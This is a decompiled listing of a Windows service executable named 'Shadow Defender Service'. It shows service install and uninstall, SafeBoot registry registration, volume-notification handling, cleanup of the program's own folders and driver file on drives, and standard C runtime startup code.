// ===== sub_140001000 @ 0x140001000 size=0x8 =====
void *sub_140001000()
{
  return &unk_14001DBB0;
}


// ===== WinMain @ 0x140001010 size=0x33f =====
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  SC_HANDLE v5; // rbx
  SC_HANDLE ServiceW; // rax
  SC_HANDLE v7; // rax
  SC_HANDLE v8; // rbx
  SC_HANDLE v9; // rdi
  SERVICE_TABLE_ENTRYW ServiceStartTable; // [rsp+70h] [rbp-298h] BYREF
  __int64 v12; // [rsp+80h] [rbp-288h]
  __int64 v13; // [rsp+88h] [rbp-280h]
  _BYTE pSecurityDescriptor[40]; // [rsp+90h] [rbp-278h] BYREF
  struct _SERVICE_STATUS pvData; // [rsp+B8h] [rbp-250h] BYREF
  WCHAR Filename[264]; // [rsp+E0h] [rbp-228h] BYREF

  ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONW)sub_140001350;
  ServiceStartTable.lpServiceName = (LPWSTR)L"{0CBD4F48-3751-475D-BE88-4F271385B672}";
  v12 = 0;
  v13 = 0;
  if ( wcsicmp((const wchar_t *)lpCmdLine, L"/install") != 0 )
  {
    if ( wcsicmp((const wchar_t *)lpCmdLine, L"/uninstall") != 0 )
    {
      InitializeSecurityDescriptor(pSecurityDescriptor, 1u);
      SetSecurityDescriptorDacl(pSecurityDescriptor, true, nullptr, false);
      pvData.dwServiceType = 24;
      pvData.dwServiceSpecificExitCode = 0;
      *(_QWORD *)&pvData.dwControlsAccepted = pSecurityDescriptor;
      hEvent = CreateEventW(
                 (LPSECURITY_ATTRIBUTES)&pvData,
                 true,
                 false,
                 L"Global\\{C6F6A26F-B5C2-4284-9AB3-767CB994D517}");
      hObject = CreateThread(nullptr, 0, StartAddress, nullptr, 0, nullptr);
      if ( !StartServiceCtrlDispatcherW(&ServiceStartTable) )
      {
        WaitForSingleObject(hObject, 0xFFFFFFFF);
        CloseHandle(hObject);
        hObject = (HANDLE)-1LL;
        CloseHandle(hEvent);
        hEvent = (HANDLE)-1LL;
      }
    }
    else
    {
      v7 = OpenSCManagerW(nullptr, nullptr, 0xF003Fu);
      v8 = v7;
      if ( v7 != nullptr )
      {
        v9 = OpenServiceW(v7, L"{0CBD4F48-3751-475D-BE88-4F271385B672}", 0x10000u);
        if ( v9 != nullptr )
        {
          ControlService(v8, 1u, &pvData);
          DeleteService(v9);
          CloseServiceHandle(v9);
        }
        CloseServiceHandle(v8);
      }
      SHDeleteKeyW(
        HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\{0CBD4F48-3751-475D-BE88-4F271385B672}");
    }
  }
  else
  {
    sub_140002F60(Filename, 0, 520);
    GetModuleFileNameW(nullptr, Filename, 0x104u);
    v5 = OpenSCManagerW(nullptr, nullptr, 0xF003Fu);
    if ( v5 != nullptr )
    {
      ServiceW = CreateServiceW(
                   v5,
                   L"{0CBD4F48-3751-475D-BE88-4F271385B672}",
                   L"Shadow Defender Service",
                   0xF01FFu,
                   0x10u,
                   2u,
                   0,
                   Filename,
                   nullptr,
                   nullptr,
                   &pszValue,
                   nullptr,
                   nullptr);
      if ( ServiceW != nullptr )
        CloseServiceHandle(ServiceW);
      CloseServiceHandle(v5);
    }
    *(_OWORD *)&pvData.dwServiceType = xmmword_1400191C0;
    SHSetValueW(
      HKEY_LOCAL_MACHINE,
      L"SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\{0CBD4F48-3751-475D-BE88-4F271385B672}",
      &pszValue,
      1u,
      &pvData,
      0x10u);
    SHSetValueW(
      HKEY_LOCAL_MACHINE,
      L"SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\{0CBD4F48-3751-475D-BE88-4F271385B672}",
      &pszValue,
      1u,
      &pvData,
      0x10u);
  }
  return 0;
}


// ===== sub_140001350 @ 0x140001350 size=0x11b =====
int sub_140001350()
{
  SERVICE_STATUS_HANDLE v0; // rax
  int NotificationFilter; // [rsp+20h] [rbp-38h] BYREF
  __int64 v3; // [rsp+24h] [rbp-34h]
  __int128 v4; // [rsp+2Ch] [rbp-2Ch]
  int v5; // [rsp+3Ch] [rbp-1Ch]

  v0 = RegisterServiceCtrlHandlerExW(L"{0CBD4F48-3751-475D-BE88-4F271385B672}", HandlerProc, nullptr);
  hServiceStatus = v0;
  if ( v0 != nullptr )
  {
    ServiceStatus.dwCheckPoint = dword_14001DBC0++;
    ServiceStatus.dwServiceType = 16;
    *(_QWORD *)&ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwCurrentState = 2;
    ServiceStatus.dwWaitHint = 60000;
    ServiceStatus.dwControlsAccepted = 129;
    SetServiceStatus(v0, &ServiceStatus);
    v3 = 5;
    v4 = xmmword_1400113F0;
    v5 = 0;
    NotificationFilter = 32;
    RegisterDeviceNotificationW(hServiceStatus, &NotificationFilter, 1u);
    ServiceStatus.dwCurrentState = 4;
    *(_QWORD *)&ServiceStatus.dwControlsAccepted = 129;
    ServiceStatus.dwWaitHint = 60000;
    ServiceStatus.dwCheckPoint = 0;
    LODWORD(v0) = SetServiceStatus((SERVICE_STATUS_HANDLE)hServiceStatus, &ServiceStatus);
  }
  return (int)v0;
}


// ===== HandlerProc @ 0x140001470 size=0x228 =====
__int64 __fastcall HandlerProc(DWORD dwControl, __int64 dwEventType, _DWORD *lpEventData, LPVOID lpContext)
{
  DWORD v5; // ecx
  DWORD v6; // ecx
  __int64 v7; // rcx
  HANDLE FileW; // rdi
  DWORD LastError; // ebx
  int v10; // eax
  unsigned __int16 i; // bx
  int OutBuffer; // [rsp+40h] [rbp-98h] BYREF
  _BYTE v14[148]; // [rsp+44h] [rbp-94h] BYREF
  DWORD BytesReturned; // [rsp+E0h] [rbp+8h] BYREF

  v5 = dwControl - 1;
  if ( v5 != 0 )
  {
    v6 = v5 - 2;
    if ( v6 == 0 )
    {
      ServiceStatus.dwCurrentState = 4;
      goto LABEL_24;
    }
    v7 = v6 - 8;
    if ( (_DWORD)v7 != 0 )
    {
      if ( (_DWORD)v7 == 3 && dword_14001DBBC == 0 )
      {
        FileW = CreateFileW(L"\\\\.\\DpControl", 0x80u, 3u, nullptr, 3u, 0x80u, nullptr);
        if ( FileW != (HANDLE)-1LL )
        {
          sub_140002F60(v14, 0, 132);
          OutBuffer = 1953524580;
          BytesReturned = 0;
          if ( !DeviceIoControl(FileW, 0x80000D18, &OutBuffer, 0x88u, &OutBuffer, 0x88u, &BytesReturned, nullptr) )
          {
            LastError = GetLastError();
            CloseHandle(FileW);
            SetLastError(LastError);
            dword_14001DBBC = 1;
            goto LABEL_24;
          }
          CloseHandle(FileW);
        }
        dword_14001DBBC = 1;
      }
    }
    else if ( (_DWORD)dwEventType == 0x8000 )
    {
      v10 = lpEventData[1];
      if ( v10 == 2 )
      {
        for ( i = 65; i <= 0x5Au; ++i )
        {
          if ( ((i > 0x42u) & lpEventData[3]) != 0 )
            sub_1400018A0(i, dwEventType, lpEventData, lpContext);
        }
      }
      else if ( v10 == 5 )
      {
        sub_140001A50(v7, dwEventType, lpEventData, lpContext);
      }
    }
  }
  else
  {
    if ( hObject != (HANDLE)-1LL )
    {
      WaitForSingleObject(hObject, 0xFFFFFFFF);
      CloseHandle(hObject);
      hObject = (HANDLE)-1LL;
    }
    ServiceStatus.dwCurrentState = 1;
  }
LABEL_24:
  *(_QWORD *)&ServiceStatus.dwControlsAccepted = 129;
  ServiceStatus.dwWaitHint = 3000;
  if ( ServiceStatus.dwCurrentState == 4 || ServiceStatus.dwCurrentState == 1 )
    ServiceStatus.dwCheckPoint = 0;
  else
    ServiceStatus.dwCheckPoint = dword_14001DBC0++;
  SetServiceStatus((SERVICE_STATUS_HANDLE)hServiceStatus, &ServiceStatus);
  return 0;
}


// ===== sub_1400016A0 @ 0x1400016a0 size=0x1f6 =====
BOOL __fastcall sub_1400016A0(const WCHAR *a1)
{
  DWORD LastError; // eax
  __int64 v3; // rax
  WCHAR v5; // cx
  HANDLE FirstFileW; // rbx
  struct _WIN32_FIND_DATAW FindFileData; // [rsp+30h] [rbp-898h] BYREF
  wchar_t Destination[264]; // [rsp+280h] [rbp-648h] BYREF
  WCHAR PathName[264]; // [rsp+490h] [rbp-438h] BYREF
  WCHAR FileName[264]; // [rsp+6A0h] [rbp-228h] BYREF

  if ( !RemoveDirectoryW(a1) )
  {
    LastError = GetLastError();
    if ( LastError != 145 && LastError != 32 )
      return false;
  }
  sub_140002F60(&FindFileData, 0, 592);
  wcscpy_s(Destination, 0x104u, a1);
  v3 = -1;
  while ( Destination[++v3] != 0 )
    ;
  v5 = FindFileData.cAlternateFileName[v3 + 13];
  if ( v5 != 92 && v5 != 47 )
    wcscat_s(Destination, 0x104u, L"\\");
  swprintf(FileName, 0x104u, L"%s*.*", Destination);
  FirstFileW = FindFirstFileW(FileName, &FindFileData);
  if ( FirstFileW == (HANDLE)-1LL )
    return false;
  do
  {
    swprintf(PathName, 0x104u, L"%s%s", Destination, FindFileData.cFileName);
    if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
    {
      if ( (FindFileData.cFileName[0] != 46 || FindFileData.cFileName[1] != 0)
        && (FindFileData.cFileName[0] != 46 || FindFileData.cFileName[1] != 46 || FindFileData.cFileName[2] != 0) )
      {
        sub_1400016A0(PathName);
      }
    }
    else
    {
      SetFileAttributesW(PathName, 0x80u);
      DeleteFileW(PathName);
    }
  }
  while ( FindNextFileW(FirstFileW, &FindFileData) || GetLastError() != 18 );
  FindClose(FirstFileW);
  return RemoveDirectoryW(a1);
}


// ===== sub_1400018A0 @ 0x1400018a0 size=0x1af =====
int __fastcall sub_1400018A0(unsigned __int16 a1)
{
  unsigned int v1; // ebx
  HANDLE FileW; // rax
  void *v3; // rbx
  DWORD BytesReturned[4]; // [rsp+40h] [rbp-4C8h] BYREF
  _BYTE OutBuffer[144]; // [rsp+50h] [rbp-4B8h] BYREF
  WCHAR Destination[264]; // [rsp+E0h] [rbp-428h] BYREF
  WCHAR FileName[256]; // [rsp+2F0h] [rbp-218h] BYREF

  v1 = a1;
  sub_140002F60(FileName, 0, 512);
  swprintf(FileName, 0x100u, L"\\\\.\\%C:", v1);
  sub_140002F60(Destination, 0, 520);
  wcscpy_s(Destination, 0x104u, FileName);
  wcscat_s(Destination, 0x104u, L"\\{0D9DB60E-B0EA-4d53-A392-A5D274956846}");
  sub_1400016A0(Destination);
  FileW = CreateFileW(FileName, 0x80000000, 3u, nullptr, 3u, 0, nullptr);
  v3 = FileW;
  if ( FileW != (HANDLE)-1LL )
  {
    BytesReturned[0] = 0;
    if ( !DeviceIoControl(FileW, 0x80002D48, OutBuffer, 0x88u, OutBuffer, 0x88u, BytesReturned, nullptr)
      && GetLastError() != 536870913 )
    {
      wcscpy_s(Destination, 0x104u, FileName);
      wcscat_s(Destination, 0x104u, L"\\diskpt0.sys");
      SetFileAttributesW(Destination, 0x80u);
      DeleteFileW(Destination);
    }
    LODWORD(FileW) = CloseHandle(v3);
  }
  return (int)FileW;
}


// ===== sub_140001A50 @ 0x140001a50 size=0x221 =====
int sub_140001A50()
{
  unsigned __int16 i; // di
  HANDLE FirstVolumeW; // rax
  void *v2; // rbx
  WCHAR RootPathName[4]; // [rsp+40h] [rbp-C0h] BYREF
  WCHAR szVolumeMountPoint[4]; // [rsp+48h] [rbp-B8h] BYREF
  WCHAR FileSystemNameBuffer[16]; // [rsp+50h] [rbp-B0h] BYREF
  WCHAR OutputString[128]; // [rsp+70h] [rbp-90h] BYREF
  WCHAR String2[256]; // [rsp+170h] [rbp+70h] BYREF
  WCHAR szVolumeName[256]; // [rsp+370h] [rbp+270h] BYREF

  for ( i = 90; i >= 0x43u; --i )
  {
    wcscpy(RootPathName, L" :\\");
    RootPathName[0] = i;
    SetLastError(0);
    LODWORD(FirstVolumeW) = GetDriveTypeW(RootPathName) - 2;
    if ( (unsigned int)FirstVolumeW <= 1 )
    {
      LODWORD(FirstVolumeW) = GetLastError();
      if ( (_DWORD)FirstVolumeW == 0 )
      {
        LODWORD(FirstVolumeW) = GetVolumeInformationW(
                                  RootPathName,
                                  nullptr,
                                  0,
                                  nullptr,
                                  nullptr,
                                  nullptr,
                                  FileSystemNameBuffer,
                                  0x10u);
        if ( (_DWORD)FirstVolumeW != 0 )
        {
          if ( wcsicmp(FileSystemNameBuffer, L"FAT") == 0
            || wcsicmp(FileSystemNameBuffer, L"FAT32") == 0
            || wcsicmp(FileSystemNameBuffer, L"FAT16") == 0
            || wcsicmp(FileSystemNameBuffer, L"EXFAT") == 0
            || (LODWORD(FirstVolumeW) = wcsicmp(FileSystemNameBuffer, L"NTFS"), (_DWORD)FirstVolumeW == 0) )
          {
            wcscpy(szVolumeMountPoint, L"C:\\");
            szVolumeMountPoint[0] = i;
            LODWORD(FirstVolumeW) = GetVolumeNameForVolumeMountPointW(szVolumeMountPoint, szVolumeName, 0x100u);
            if ( (_DWORD)FirstVolumeW != 0 )
            {
              FirstVolumeW = FindFirstVolumeW(String2, 0x100u);
              v2 = FirstVolumeW;
              if ( FirstVolumeW != (HANDLE)-1LL )
              {
                while ( wcsicmp(szVolumeName, String2) != 0 )
                {
                  if ( !FindNextVolumeW(v2, String2, 0x100u) )
                  {
                    LODWORD(FirstVolumeW) = FindVolumeClose(v2);
                    goto LABEL_16;
                  }
                }
                FindVolumeClose(v2);
                sub_140001FE0((int)OutputString, (int)L"!!! %C: =>.\n");
                OutputDebugStringW(OutputString);
                LODWORD(FirstVolumeW) = sub_1400018A0(i);
              }
            }
          }
        }
      }
    }
LABEL_16:
    ;
  }
  return (int)FirstVolumeW;
}


// ===== sub_140001C80 @ 0x140001c80 size=0x333 =====
BOOL sub_140001C80()
{
  HANDLE CurrentThread; // rax
  UINT v1; // esi
  DWORD LogicalDrives; // eax
  unsigned __int16 v3; // bx
  BOOL result; // eax
  struct _PROCESS_INFORMATION ProcessInformation; // [rsp+50h] [rbp-B0h] BYREF
  DWORD pcbData; // [rsp+68h] [rbp-98h] BYREF
  DWORD pdwType; // [rsp+6Ch] [rbp-94h] BYREF
  int pvData[4]; // [rsp+70h] [rbp-90h] BYREF
  struct _STARTUPINFOW StartupInfo; // [rsp+80h] [rbp-80h] BYREF
  WCHAR CommandLine[256]; // [rsp+F0h] [rbp-10h] BYREF

  CurrentThread = GetCurrentThread();
  SetThreadPriority(CurrentThread, 15);
  v1 = SetErrorMode(2u);
  LogicalDrives = GetLogicalDrives();
  v3 = 90;
  while ( _bittest((const int *)&LogicalDrives, (unsigned __int8)(v3 - 65)) )
  {
    if ( --v3 < 0x43u )
      goto LABEL_10;
  }
  pdwType = 4;
  pcbData = 4;
  dword_14001DBB8 = 0;
  SHGetValueW(
    HKEY_CURRENT_USER,
    L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
    L"NoDriveAutoRun",
    &pdwType,
    &dword_14001DBB8,
    &pcbData);
  pvData[0] = 0x7FFFFFF;
  SHSetValueW(
    HKEY_CURRENT_USER,
    L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
    L"NoDriveAutoRun",
    4u,
    pvData,
    4u);
  sub_140002F60(CommandLine, 0, 512);
  swprintf(CommandLine, 0x100u, L"mountvol %C: /s", v3);
  sub_140002F60(&StartupInfo, 0, 104);
  StartupInfo.cb = 104;
  memset(&ProcessInformation, 0, sizeof(ProcessInformation));
  StartupInfo.dwFlags = 1;
  StartupInfo.wShowWindow = 0;
  if ( CreateProcessW(
         nullptr,
         CommandLine,
         nullptr,
         nullptr,
         false,
         0,
         nullptr,
         nullptr,
         &StartupInfo,
         &ProcessInformation) )
  {
    WaitForSingleObject(ProcessInformation.hProcess, 0xFFFFFFFF);
    CloseHandle(ProcessInformation.hThread);
    CloseHandle(ProcessInformation.hProcess);
  }
  sub_1400018A0(v3);
  sub_140002F60(CommandLine, 0, 512);
  swprintf(CommandLine, 0x100u, L"mountvol %C: /d", v3);
  sub_140002F60(&StartupInfo, 0, 104);
  StartupInfo.cb = 104;
  memset(&ProcessInformation, 0, sizeof(ProcessInformation));
  StartupInfo.dwFlags = 1;
  StartupInfo.wShowWindow = 0;
  if ( CreateProcessW(
         nullptr,
         CommandLine,
         nullptr,
         nullptr,
         false,
         0,
         nullptr,
         nullptr,
         &StartupInfo,
         &ProcessInformation) )
  {
    WaitForSingleObject(ProcessInformation.hProcess, 0xFFFFFFFF);
    CloseHandle(ProcessInformation.hThread);
    CloseHandle(ProcessInformation.hProcess);
  }
  SHSetValueW(
    HKEY_CURRENT_USER,
    L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
    L"NoDriveAutoRun",
    4u,
    &dword_14001DBB8,
    4u);
LABEL_10:
  SetErrorMode(v1);
  SetEvent(hEvent);
  result = CloseHandle(hEvent);
  hEvent = (HANDLE)-1LL;
  return result;
}


// ===== StartAddress @ 0x140001fc0 size=0x1b =====
__int64 __fastcall StartAddress(LPVOID lpThreadParameter)
{
  GetTickCount();
  sub_140001C80();
  sub_140001A50();
  return 0;
}


// ===== sub_140001FE0 @ 0x140001fe0 size=0x5a =====
__int64 sub_140001FE0(int a1, int a2, ...)
{
  _QWORD *v4; // rax
  __int64 result; // rax
  va_list va; // [rsp+60h] [rbp+18h] BYREF

  va_start(va, a2);
  v4 = sub_140001000();
  result = unknown_libname_13(*v4, a1, 128, a2, nullptr, (__int64)va);
  if ( (int)result < 0 )
    return 0xFFFFFFFFLL;
  return result;
}


// ===== swprintf @ 0x140002040 size=0x57 =====
int swprintf(wchar_t *const Buffer, const size_t BufferCount, const wchar_t *const Format, ...)
{
  int v3; // esi
  int v4; // ebx
  int v5; // edi
  _QWORD *v6; // rax
  int result; // eax
  va_list va; // [rsp+78h] [rbp+20h] BYREF

  va_start(va, Format);
  v3 = (int)Format;
  v4 = BufferCount;
  v5 = (int)Buffer;
  v6 = sub_140001000();
  result = unknown_libname_13(*v6, v5, v4, v3, nullptr, (__int64)va);
  if ( result < 0 )
    return -1;
  return result;
}


// ===== ?pre_c_initialization@@YAHXZ @ 0x140002098 size=0xb7 =====
int __fastcall pre_c_initialization()
{
  int startup_file_mode; // eax
  _DWORD *v1; // rbx
  struct _exception *v2; // rcx
  charNode *v3; // rcx
  _crt_argv_mode v4; // eax
  struct _exception *v5; // rcx
  int v6; // eax
  struct _exception *v7; // rcx
  struct _exception *v8; // rcx
  int result; // eax

  sub_140005748(2);
  startup_file_mode = get_startup_file_mode();
  set_fmode(startup_file_mode);
  v1 = (_DWORD *)sub_14000627C();
  *v1 = UserMathErrorFunction(v2);
  if ( (unsigned __int8)_scrt_initialize_onexit_tables(1) != 0 )
  {
    sub_140002944();
    atexit(sub_140002980);
    v4 = (unsigned int)charNode::raw_length(v3);
    if ( configure_wide_argv(v4) == 0 )
    {
      sub_1400026B8();
      if ( (unsigned int)_scrt_is_user_matherr_present() != 0 )
        _setusermatherr(UserMathErrorFunction);
      v6 = UserMathErrorFunction(v5);
      configthreadlocale(v6);
      if ( (unsigned __int8)sub_1400026C8() != 0 )
        common_initialize_environment_nolock<wchar_t>();
      UserMathErrorFunction(v7);
      result = j_UserMathErrorFunction(v8);
      if ( result == 0 )
        return result;
    }
  }
  _scrt_fastfail(7);
  JUMPOUT(0x14000214ELL);
}


// ===== ?post_pgo_initialization@@YAHXZ @ 0x140002150 size=0x10 =====
__int64 __fastcall post_pgo_initialization()
{
  _scrt_initialize_default_local_stdio_options();
  return 0;
}


// ===== ?pre_cpp_initialization@@YAXXZ @ 0x140002160 size=0x19 =====
void __fastcall pre_cpp_initialization()
{
  struct _exception *v0; // rcx
  int v1; // eax

  _scrt_set_unhandled_exception_filter();
  v1 = UserMathErrorFunction(v0);
  set_new_mode(v1);
}


// ===== ?__scrt_common_main_seh@@YAHXZ @ 0x14000217c size=0x171 =====
__int64 __fastcall __scrt_common_main_seh()
{
  unsigned int v0; // ebx
  __int64 v1; // rcx
  char v2; // di
  __int64 v3; // rcx
  __int64 v5; // rcx
  _QWORD *v6; // rax
  __int64 v7; // rcx
  void (__fastcall **v8)(_QWORD, __int64); // rbx
  _tls_callback_type *v9; // rax
  __int64 v10; // rcx
  _tls_callback_type *v11; // rbx
  int show_window_mode; // ebx
  wchar_t *wide_winmain_command_line; // rax
  __int64 v14; // rcx
  __int64 v15; // rcx

  if ( (unsigned __int8)_scrt_initialize_crt(1) == 0 )
  {
    _scrt_fastfail(7);
    goto LABEL_19;
  }
  v2 = 0;
  LOBYTE(v0) = _scrt_acquire_startup_lock(v1);
  v3 = (unsigned int)dword_14001C920;
  if ( dword_14001C920 == 1 )
  {
LABEL_19:
    _scrt_fastfail(7);
    goto LABEL_20;
  }
  if ( dword_14001C920 != 0 )
  {
    v2 = 1;
  }
  else
  {
    dword_14001C920 = 1;
    if ( initterm_e((_PIFV *)&qword_140011378, (_PIFV *)&qword_1400113A8) != 0 )
      return 255;
    initterm((_PVFV *)&First, (_PVFV *)&Last);
    dword_14001C920 = 2;
  }
  LOBYTE(v3) = v0;
  _scrt_release_startup_lock(v3);
  v6 = (_QWORD *)sub_140002700(v5);
  v8 = (void (__fastcall **)(_QWORD, __int64))v6;
  if ( *v6 != 0 && (unsigned __int8)_scrt_is_nonwritable_in_current_image(v6) != 0 )
    (*v8)(0, 2);
  v9 = (_tls_callback_type *)sub_140002708(v7);
  v11 = v9;
  if ( *v9 != nullptr && (unsigned __int8)_scrt_is_nonwritable_in_current_image(v9) != 0 )
    register_thread_local_exe_atexit_callback(*v11);
  show_window_mode = (unsigned __int16)_scrt_get_show_window_mode(v10);
  wide_winmain_command_line = get_wide_winmain_command_line();
  v0 = WinMain((HINSTANCE)0x140000000LL, nullptr, (LPSTR)wide_winmain_command_line, show_window_mode);
  if ( (unsigned __int8)_scrt_is_managed_app(v14) == 0 )
LABEL_20:
    exit(v0);
  if ( v2 == 0 )
    cexit();
  LOBYTE(v15) = 1;
  _scrt_uninitialize_crt(v15, 0);
  return v0;
}


// ===== start @ 0x1400022f0 size=0x12 =====
__int64 start()
{
  _security_init_cookie();
  return __scrt_common_main_seh();
}


// ===== j_j__free_base @ 0x140002304 size=0x5 =====
// attributes: thunk
void __cdecl j_j__free_base(void *Block)
{
  j__free_base(Block);
}


// ===== __security_check_cookie @ 0x140002320 size=0x21 =====
void __cdecl _security_check_cookie(uintptr_t StackCookie)
{
  __int64 v1; // rcx

  if ( StackCookie != _security_cookie )
ReportFailure:
    _report_gsfailure(StackCookie);
  v1 = __ROL8__(StackCookie, 16);
  if ( (_WORD)v1 != 0 )
  {
    StackCookie = __ROR8__(v1, 16);
    goto ReportFailure;
  }
}


// ===== __scrt_acquire_startup_lock @ 0x140002344 size=0x39 =====
char _scrt_acquire_startup_lock()
{
  PVOID StackBase; // rcx
  signed __int64 v1; // rax

  if ( (unsigned int)_scrt_is_ucrt_dll_in_use() != 0 )
  {
    StackBase = NtCurrentTeb()->NtTib.StackBase;
    while ( 1 )
    {
      v1 = _InterlockedCompareExchange64(&qword_14001C928, (signed __int64)StackBase, 0);
      if ( v1 == 0 )
        break;
      if ( StackBase == (PVOID)v1 )
        return 1;
    }
  }
  return 0;
}


// ===== __scrt_initialize_crt @ 0x140002380 size=0x49 =====
char __fastcall _scrt_initialize_crt(int a1)
{
  char v1; // al

  v1 = byte_14001C930;
  if ( a1 == 0 )
    v1 = 1;
  byte_14001C930 = v1;
  _isa_available_init();
  if ( !_vcrt_initialize() )
    return 0;
  if ( !_acrt_initialize() )
  {
    _vcrt_uninitialize(false);
    return 0;
  }
  return 1;
}


// ===== __scrt_initialize_onexit_tables @ 0x1400023cc size=0xd8 =====
char __fastcall _scrt_initialize_onexit_tables(unsigned int a1)
{
  _PVFV *v3; // rax
  __int128 v4; // [rsp+20h] [rbp-28h]

  if ( byte_14001C931 == 0 )
  {
    if ( a1 > 1 )
    {
      _scrt_fastfail(5);
      __debugbreak();
    }
    if ( (unsigned int)_scrt_is_ucrt_dll_in_use() == 0 || a1 != 0 )
    {
      v3 = (_PVFV *)(_security_cookie ^ __ROR8__(-1, 64 - ((unsigned __int8)_security_cookie & 0x3Fu)));
      *(_QWORD *)&v4 = v3;
      *((_QWORD *)&v4 + 1) = v3;
      *(_OWORD *)&stru_14001C938._first = v4;
      *(_QWORD *)&v4 = v3;
      *((_QWORD *)&v4 + 1) = v3;
      stru_14001C938._end = v3;
      *(_OWORD *)&stru_14001C950._first = v4;
      stru_14001C950._end = v3;
    }
    else if ( initialize_onexit_table(&stru_14001C938) != 0 || initialize_onexit_table(&stru_14001C950) != 0 )
    {
      return 0;
    }
    byte_14001C931 = 1;
  }
  return 1;
}


// ===== __scrt_is_nonwritable_in_current_image @ 0x1400024a4 size=0x99 =====
bool __fastcall _scrt_is_nonwritable_in_current_image(__int64 a1)
{
  unsigned __int64 v1; // r8
  _DWORD *v2; // rdx
  _DWORD *v3; // r9
  unsigned __int64 v4; // rcx

  if ( LOWORD(MEMORY[0x140000000].unused) != 23117
    || *(_DWORD *)(MEMORY[0x14000003C] + 0x140000000LL) != 17744
    || *(_WORD *)(MEMORY[0x14000003C] + 0x140000018LL) != 523 )
  {
    return false;
  }
  v1 = a1 - 0x140000000LL;
  v2 = (_DWORD *)(*(unsigned __int16 *)(MEMORY[0x14000003C] + 0x140000014LL) + MEMORY[0x14000003C] + 0x140000018LL);
  v3 = &v2[10 * *(unsigned __int16 *)(MEMORY[0x14000003C] + 0x140000006LL)];
  while ( v2 != v3 )
  {
    v4 = (unsigned int)v2[3];
    if ( v1 >= v4 && v1 < (unsigned int)(v4 + v2[2]) )
      return v2 != nullptr && v2[9] >= 0;
    v2 += 10;
  }
  v2 = nullptr;
  return v2 != nullptr && v2[9] >= 0;
}


// ===== __scrt_release_startup_lock @ 0x140002540 size=0x24 =====
__int64 __fastcall _scrt_release_startup_lock(char a1)
{
  __int64 result; // rax

  result = _scrt_is_ucrt_dll_in_use();
  if ( (_DWORD)result != 0 && a1 == 0 )
    _InterlockedExchange64(&qword_14001C928, 0);
  return result;
}


// ===== __scrt_uninitialize_crt @ 0x140002564 size=0x2b =====
char __fastcall _scrt_uninitialize_crt(__crt_bool a1, char a2)
{
  if ( byte_14001C930 == 0 || a2 == 0 )
  {
    _acrt_uninitialize(a1);
    _vcrt_uninitialize(a1);
  }
  return 1;
}


// ===== _onexit @ 0x140002590 size=0x4f =====
_onexit_t __cdecl onexit(_onexit_t Func)
{
  int v2; // eax
  int (__cdecl *v3)(); // rcx

  if ( __ROR8__((uintptr_t)stru_14001C938._first ^ _security_cookie, _security_cookie & 0x3F) == -1 )
    v2 = sub_140006644(Func);
  else
    v2 = register_onexit_function(&stru_14001C938, Func);
  v3 = nullptr;
  if ( v2 == 0 )
    return Func;
  return v3;
}


// ===== atexit @ 0x1400025e0 size=0x17 =====
int __cdecl atexit(void (__cdecl *a1)())
{
  return (onexit((_onexit_t)a1) != nullptr) - 1;
}


// ===== __security_init_cookie @ 0x1400025f8 size=0xac =====
void __cdecl _security_init_cookie()
{
  uintptr_t v0; // rax
  struct _FILETIME v1; // [rsp+30h] [rbp+10h] BYREF
  struct _FILETIME SystemTimeAsFileTime; // [rsp+38h] [rbp+18h] BYREF
  LARGE_INTEGER PerformanceCount; // [rsp+40h] [rbp+20h] BYREF

  v0 = _security_cookie;
  if ( _security_cookie == 0x2B992DDFA232LL )
  {
    SystemTimeAsFileTime = 0;
    GetSystemTimeAsFileTime(&SystemTimeAsFileTime);
    v1 = SystemTimeAsFileTime;
    v1 = (struct _FILETIME)(GetCurrentThreadId() ^ *(unsigned __int64 *)&v1);
    v1 = (struct _FILETIME)(GetCurrentProcessId() ^ *(unsigned __int64 *)&v1);
    QueryPerformanceCounter(&PerformanceCount);
    v0 = ((unsigned __int64)&v1
        ^ *(_QWORD *)&v1
        ^ PerformanceCount.QuadPart
        ^ ((unsigned __int64)PerformanceCount.LowPart << 32))
       & 0xFFFFFFFFFFFFLL;
    if ( v0 == 0x2B992DDFA232LL )
      v0 = 0x2B992DDFA233LL;
    _security_cookie = v0;
  }
  qword_14001C008 = ~v0;
}


// ===== UserMathErrorFunction @ 0x1400026a4 size=0x3 =====
__int64 __fastcall UserMathErrorFunction(struct _exception *a1)
{
  return 0;
}


// ===== ?raw_length@charNode@@UEBAHXZ @ 0x1400026a8 size=0x6 =====
__int64 __fastcall charNode::raw_length(charNode *this)
{
  return 1;
}


// ===== _get_startup_file_mode @ 0x1400026b0 size=0x6 =====
__int64 get_startup_file_mode()
{
  return 0x4000;
}


// ===== sub_1400026B8 @ 0x1400026b8 size=0xe =====
void sub_1400026B8()
{
  InitializeSListHead(&stru_14001C970);
}


// ===== sub_1400026C8 @ 0x1400026c8 size=0x3 =====
char sub_1400026C8()
{
  return 1;
}


// ===== _guard_check_icall_nop @ 0x1400026cc size=0x3 =====
void guard_check_icall_nop()
{
  ;
}


// ===== sub_1400026D0 @ 0x1400026d0 size=0x8 =====
void *sub_1400026D0()
{
  return &unk_14001C980;
}


// ===== __scrt_initialize_default_local_stdio_options @ 0x1400026d8 size=0x1b =====
_QWORD *_scrt_initialize_default_local_stdio_options()
{
  _QWORD *v0; // rax
  _QWORD *result; // rax

  v0 = sub_140001000();
  *v0 |= 4uLL;
  result = sub_1400026D0();
  *result |= 2uLL;
  return result;
}


// ===== __scrt_is_user_matherr_present @ 0x1400026f4 size=0xc =====
_BOOL8 _scrt_is_user_matherr_present()
{
  return dword_14001C004 == 0;
}


// ===== sub_140002700 @ 0x140002700 size=0x8 =====
void *sub_140002700()
{
  return &unk_14001DC00;
}


// ===== sub_140002708 @ 0x140002708 size=0x8 =====
void *sub_140002708()
{
  return &unk_14001DBF8;
}


